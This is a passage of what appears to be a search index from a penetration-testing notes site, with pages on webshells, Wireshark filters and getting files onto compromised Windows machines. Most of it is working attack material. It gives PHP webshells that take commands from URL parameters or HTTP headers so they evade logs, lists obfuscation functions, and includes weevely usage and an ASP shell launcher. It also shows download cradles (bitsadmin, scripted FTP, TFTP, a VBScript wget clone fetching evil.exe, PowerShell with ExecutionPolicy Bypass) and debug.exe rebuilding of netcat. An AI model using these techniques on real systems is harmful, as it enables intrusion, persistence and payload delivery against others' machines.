c:\\Inetpub\\shell443.exe\",0,True) %> References # http://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/ http://www.binarytides.com/web-shells-tutorial/","title":"Webshells"},{"location":"tools/webshell/#webshell","text":"A webshell is a shell that you can access through the web. This is useful for when you have firewalls that filter outgoing traffic on ports other than port 80. As long as you have a webserver, and want it to function, you can't filter our traffic on port 80 (and 443). It is also a bit more stealthy than a reverse shell on other ports since the traffic is hidden in the http traffic. You have access to different kinds of webshells on Kali here: /usr/share/webshells","title":"Webshell"},{"location":"tools/webshell/#php","text":"This code can be injected into pages that use php. # Execute one command <?php system(\"whoami\"); ?> # Take input from the url paramter. shell.php?cmd=whoami <?php system($_GET['cmd']); ?> # The same but using passthru <?php passthru($_GET['cmd']); ?> # For shell_exec to output the result you need to echo it <?php echo shell_exec(\"whoami\");?> # Exec() does not output the result without echo, and only output the last line. So not very useful! <?php echo exec(\"whoami\");?> # Instead to this if you can. It will return the output as an array, and then print it all. <?php exec(\"ls -la\",$array); print_r($array); ?> # preg_replace(). This is a cool trick <?php preg_replace('/.*/e', 'system(\"whoami\");', ''); ?> # Using backticks <?php $output = `whoami`; echo \"<pre>$output</pre>\"; ?> # Using backticks <?php echo `whoami`; ?> You can then call then execute the commands like this: http://192.168.1.103/index.php?cmd=pwd","title":"PHP"},{"location":"tools/webshell/#make-it-stealthy","text":"We can make the commands from above a bit more stealthy. Instead of passing the cmds through the url, which will be obvious in logs, we cna pass them through other header-paramters. The use tampterdata or burpsuite to insert the commands. Or just netcat or curl. <?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?> <?php system($_SERVER['HTTP_USER_AGENT'])?> # I have had to use this one <?php echo passthru($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>","title":"Make it stealthy"},{"location":"tools/webshell/#obfuscation","text":"The following functions can be used to obfuscate the code. eval() assert() base64() gzdeflate() str_rot13()","title":"Obfuscation"},{"location":"tools/webshell/#weevely-incredible-tool","text":"Using weevely we can create php webshells easily. weevely generate password /root/webshell.php Not we execute it and get a shell in return: weevely \"http://192.168.1.101/webshell.php\" password","title":"Weevely - Incredible tool!"},{"location":"tools/webshell/#asp","text":"<% Dim oS On Error Resume Next Set oS = Server.CreateObject(\"WSCRIPT.SHELL\") Call oS.Run(\"win.com cmd.exe /c c:\\Inetpub\\shell443.exe\",0,True) %>","title":"ASP"},{"location":"tools/webshell/#references","text":"http://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/ http://www.binarytides.com/web-shells-tutorial/","title":"References"},{"location":"tools/wget/","text":"wget # Wget is just an incredible useful tool. It be used to download stuff. If you need to use wget through a proxy you can do the following: wget \"http://example.com/get_album_item.php?size=version%28%29%20;%20--\" -O output.txt -e use_proxy=yes -e http_proxy=192.168.101.8:3128 --proxy-user \"username\" --proxy-password \"password\"","title":"Wget"},{"location":"tools/wget/#wget","text":"Wget is just an incredible useful tool. It be used to download stuff. If you need to use wget through a proxy you can do the following: wget \"http://example.com/get_album_item.php?size=version%28%29%20;%20--\" -O output.txt -e use_proxy=yes -e http_proxy=192.168.101.8:3128 --proxy-user \"username\" --proxy-password \"password\"","title":"wget"},{"location":"tools/wireshark/","text":"Wireshark # So now that you have entered a network and intercepted the traffic it is time to analyze that traffic. That can be with wireshark. Filters # There are two types of filters that we can use. 1. Capture filter - This filters out in the capture process, so that it does not capture what you have not specified. 2. Display filter - This filter just filters what you see. You might have captured 1000 packets, but using the display filter you will only be shown say 100 packets that are relevant to you. The syntax for the two filters are a bit different. Capture filter # So if you just start capturing all traffic on a network you are soon going to get stuck with a ton of packets. Too many! So we might need to refine out capture. Click on the fourth icon from the left. If you hover over it it says Capture options Some useful might be. From a specific host and with a specific port: host 192.168.1.102 port 110 Display filter # Show only packets used by this IP-address, or to a specific port ip.addr == 192.168.1.102 tcp.port eq 25 Automatically resolve ip-addresses # Easy https://ask.wireshark.org/questions/37680/can-wireshark-automatically-resolve-the-ip-address-into-host-names","title":"Wireshark"},{"location":"tools/wireshark/#wireshark","text":"So now that you have entered a network and intercepted the traffic it is time to analyze that traffic. That can be with wireshark.","title":"Wireshark"},{"location":"tools/wireshark/#filters","text":"There are two types of filters that we can use. 1. Capture filter - This filters out in the capture process, so that it does not capture what you have not specified. 2. Display filter - This filter just filters what you see. You might have captured 1000 packets, but using the display filter you will only be shown say 100 packets that are relevant to you. The syntax for the two filters are a bit different.","title":"Filters"},{"location":"tools/wireshark/#capture-filter","text":"So if you just start capturing all traffic on a network you are soon going to get stuck with a ton of packets. Too many! So we might need to refine out capture. Click on the fourth icon from the left. If you hover over it it says Capture options Some useful might be. From a specific host and with a specific port: host 192.168.1.102 port 110","title":"Capture filter"},{"location":"tools/wireshark/#display-filter","text":"Show only packets used by this IP-address, or to a specific port ip.addr == 192.168.1.102 tcp.port eq 25","title":"Display filter"},{"location":"tools/wireshark/#automatically-resolve-ip-addresses","text":"Easy https://ask.wireshark.org/questions/37680/can-wireshark-automatically-resolve-the-ip-address-into-host-names","title":"Automatically resolve ip-addresses"},{"location":"transferring_files/transfering_files/","text":"Transferring Files to Windows # Transferring files to Linux is usually pretty easy. We can use netcat , wget , or curl , which most systems have as default. But windows does not have these tools. To and from client to server SMB / RDP # If you are using RDP on windows you can just attach a directory to share from when you start your RDP session. xfreerdp /u:MYUSERNAME /v:10.10.10.1111 /drive:fildel,/home/temp/tmp Now you can simply open the Computer part in your Explorer window, and you should see the disk fildel . In that share you can share documents between your computer and the RDP server. From client to server SMB / RDP # A simple way is simply to to connect to your server with xfreerdp and then open up the fil-browser in your linux machine, and copy the file. Then go to your windows server and simply paste the file. For me it only works in that direction, and not the reverse. From X server to Windows (Bitsadmin) # Downloading a file with CMD can be done with bitsadmin. bitsadmin /transfer aaa http://192.168.66.87/apaa.txt c:\\Users\\temp\\aaa.txt FTP # Most windows machines have a ftp-client included. But we can't use it interactively since that most likely would kill our shell. So we have get around that. We can however run commands from a file. So what we want to do is to echo out the commands into a textfile. And then use that as our input to the ftp-client. Let me demonstrate. On the compromised machine we echo out the following commands into a file echo open 192.168.1.101 21> ftp.txt echo USER asshat>> ftp.txt echo mysecretpassword>> ftp.txt echo bin>> ftp.txt echo GET wget.exe>> ftp.txt echo bye>> ftp.txt Then run this command to connect to the ftp ftp -v -n -s:ftp.txt Of course you need to have a ftp-server configured with the user asshat and the password to mysecretpassword. TFTP # Works by default on: Windows XP Windows 2003 A TFTP client is installed by default on windows machines up to Windows XP and Windows 2003. What is good about TFTP is that you can use it non-interactively. Which means less risk of losing your shell. Kali has a TFTP server build in. You can server up some files with it like this atftpd --daemon --port 69 /tftp /etc/init.d/atftpd restart Now you can put stuff in /srv/tftp and it will be served. Remember that TFTP used UDP. So if you run netstat it will not show it as listening. You can see it running like this netstat -a -p UDP | grep udp So now you can upload and download whatever from the windows-machine like this tftp -i 192.160.1.101 GET wget.exe If you like to test that the tftp-server is working you can test it from Linux, I don't think it has a non-interactive way. tftp 192.160.1.101 GET test.txt I usually put all files I want to make available in /srv/tftp If you want to make sure that the file was uploaded correct you can check in the syslog. Grep for the IP like this: grep 192.168.1.101 /var/log/syslog VBScript # Here is a good script to make a wget-clone in VB. If it doesn't work try piping it through unix2dos before copying it. echo strUrl = WScript.Arguments.Item(0) > wget.vbs echo StrFile = WScript.Arguments.Item(1) >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs echo Err.Clear >> wget.vbs echo Set http = Nothing >> wget.vbs echo Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") >> wget.vbs echo If http Is Nothing Then Set http = CreateObject(\"WinHttp.WinHttpRequest\") >> wget.vbs echo If http Is Nothing Then Set http = CreateObject(\"MSXML2.ServerXMLHTTP\") >> wget.vbs echo If http Is Nothing Then Set http = CreateObject(\"Microsoft.XMLHTTP\") >> wget.vbs echo http.Open \"GET\",strURL,False >> wget.vbs echo http.Send >> wget.vbs echo varByteArray = http.ResponseBody >> wget.vbs echo Set http = Nothing >> wget.vbs echo Set fs = CreateObject(\"Scripting.FileSystemObject\") >> wget.vbs echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs echo strData = \"\" >> wget.vbs echo strBuffer = \"\" >> wget.vbs echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs echo Next >> wget.vbs echo ts.Close >> wget.vbs You then execute the script like this: cscript wget.vbs http://192.168.10.5/evil.exe evil.exe PowerShell # This is how we can download a file using PowerShell. Remember since we only have a non-interactive shell we cannot start PowerShell.exe, because our shell can't handle that. But we can get around that by creaing a PowerShell-script and then executing the script: echo $storageDir = $pwd > wget.ps1 echo $webclient = New-Object System.Net.WebClient >>wget.ps1 echo $url = \"http://192.168.1.101/file.exe\" >>wget.ps1 echo $file = \"output-file.exe\" >>wget.ps1 echo $webclient.DownloadFile($url,$file) >>wget.ps1 Now we invoke it with this crazy syntax: powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 Debug.exe # This is a crazy technique that works on windows 32 bit machines. Basically the idea is to use the debug.exe program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take a binaries, like netcat . And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with debug.exe . Debug.exe can only assemble 64 kb. So we need to use files smaller than that. We can use upx to compress it even more. So let's do that: upx -9 nc.exe Now it only weights 29 kb. Perfect. So now let's disassemble it: wine exe2bat.exe nc.exe nc.txt Now we just copy-past the text into our windows-shell. And it will automatically create a file called nc.exe Transfering files Windows to linux # smb-client # If you only have a hash of a user which is","title":"Transferring Files Linux"},{"location":"transferring_files/transfering_files/#transferring-files-to-windows","text":"Transferring files to Linux is usually pretty easy. We can use netcat , wget , or curl , which most systems have as default. But windows does not have these tools.","title":"Transferring Files to Windows"},{"location":"transferring_files/transfering_files/#to-and-from-client-to-server-smb-rdp","text":"If you are using RDP on windows you can just attach a directory to share from when you start your RDP session. xfreerdp /u:MYUSERNAME /v:10.10.10.1111 /drive:fildel,/home/temp/tmp Now you can simply open the Computer part in your Explorer window, and you should see the disk fildel . In that share you can share documents between your computer and the RDP server.","title":"To and from client to server SMB / RDP"},{"location":"transferring_files/transfering_files/#from-client-to-server-smb-rdp","text":"A simple way is simply to to connect to your server with xfreerdp and then open up the fil-browser in your linux machine, and copy the file. Then go to your windows server and simply paste the file. For me it only works in that direction, and not the reverse.","title":"From client to server SMB / RDP"},{"location":"transferring_files/transfering_files/#from-x-server-to-windows-bitsadmin","text":"Downloading a file with CMD can be done with bitsadmin. bitsadmin /transfer aaa http://192.168.66.87/apaa.txt c:\\Users\\temp\\aaa.txt","title":"From X server to Windows (Bitsadmin)"},{"location":"transferring_files/transfering_files/#ftp","text":"Most windows machines have a ftp-client included. But we can't use it interactively since that most likely would kill our shell. So we have get around that. We can however run commands from a file. So what we want to do is to echo out the commands into a textfile. And then use that as our input to the ftp-client. Let me demonstrate. On the compromised machine we echo out the following commands into a file echo open 192.168.1.101 21> ftp.txt echo USER asshat>> ftp.txt echo mysecretpassword>> ftp.txt echo bin>> ftp.txt echo GET wget.exe>> ftp.txt echo bye>> ftp.txt Then run this command to connect to the ftp ftp -v -n -s:ftp.txt Of course you need to have a ftp-server configured with the user asshat and the password to mysecretpassword.","title":"FTP"},{"location":"transferring_files/transfering_files/#tftp","text":"Works by default on: Windows XP Windows 2003 A TFTP client is installed by default on windows machines up to Windows XP and Windows 2003. What is good about TFTP is that you can use it non-interactively. Which means less risk of losing your shell. Kali has a TFTP server build in. You can server up some files with it like this atftpd --daemon --port 69 /tftp /etc/init.d/atftpd restart Now you can put stuff in /srv/tftp and it will be served. Remember that TFTP used UDP. So if you run netstat it will not show it as listening. You can see it running like this netstat -a -p UDP | grep udp So now you can upload and download whatever from the windows-machine like this tftp -i 192.160.1.101 GET wget.exe If you like to test that the tftp-server is working you can test it from Linux, I don't think it has a non-interactive way. tftp 192.160.1.101 GET test.txt I usually put all files I want to make available in /srv/tftp If you want to make sure that the file was uploaded correct you can check in the syslog. Grep for the IP like this: grep 192.168.1.101 /var/log/syslog","title":"TFTP"},{"location":"transferring_files/transfering_files/#vbscript","text":"Here is a good script to make a wget-clone in VB. If it doesn't work try piping it through unix2dos before copying it. echo strUrl = WScript.Arguments.Item(0) > wget.vbs echo StrFile = WScript.Arguments.Item(1) >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs echo Err.Clear >> wget.vbs echo Set http = Nothing >> wget.vbs echo Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") >> wget.vbs echo If http Is Nothing Then Set http = CreateObject(\"WinHttp.WinHttpRequest\") >> wget.vbs echo If http Is Nothing Then Set http = CreateObject(\"MSXML2.ServerXMLHTTP\") >> wget.vbs echo If http Is Nothing Then Set http = CreateObject(\"Microsoft.XMLHTTP\") >> wget.vbs echo http.Open \"GET\",strURL,False >> wget.vbs echo http.Send >> wget.vbs echo varByteArray = http.ResponseBody >> wget.vbs echo Set http = Nothing >> wget.vbs echo Set fs = CreateObject(\"Scripting.FileSystemObject\") >> wget.vbs echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs echo strData = \"\" >> wget.vbs echo strBuffer = \"\" >> wget.vbs echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs echo Next >> wget.vbs echo ts.Close >> wget.vbs You then execute the script like this: cscript wget.vbs http://192.168.10.5/evil.exe evil.exe","title":"VBScript"},{"location":"transferring_files/transfering_files/#powershell","text":"This is how we can download a file using PowerShell. Remember since we only have a non-interactive shell we cannot start PowerShell.exe, because our shell can't handle that. But we can get around that by creaing a PowerShell-script and then executing the script: echo $storageDir = $pwd > wget.ps1 echo $webclient = New-Object System.Net.WebClient >>wget.ps1 echo $url = \"http://192.168.1.101/file.exe\" >>wget.ps1 echo $file = \"output-file.exe\" >>wget.ps1 echo $webclient.DownloadFile($url,$file) >>wget.ps1 Now we invoke it with this crazy syntax: powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1","title":"PowerShell"},{"location":"transferring_files/transfering_files/#debugexe","text":"This is a crazy technique that works on windows 32 bit machines. Basically the idea is to use the debug.exe program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take a binaries, like netcat . And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with debug.exe . Debug.exe can only assemble 64 kb. So we need to use files smaller than that. We can use upx to compress it even more. So let's do that: upx -9 nc.exe Now it only weights 29 kb. Perfect. So now let's disassemble it: wine exe2bat.exe nc.exe nc.txt Now we just copy-past the text into our windows-shell. And it will automatically create a file called nc.exe","title":"Debug.exe"},{"location":"transferring_files/transfering_files/#transfering-files-windows-to-linux","text":"","title":"Transfering files Windows to linux"},{"location":"transferring_files/transfering_files/#smb-client","text":"If you only have a hash of a user which is","title":"smb-client"}]}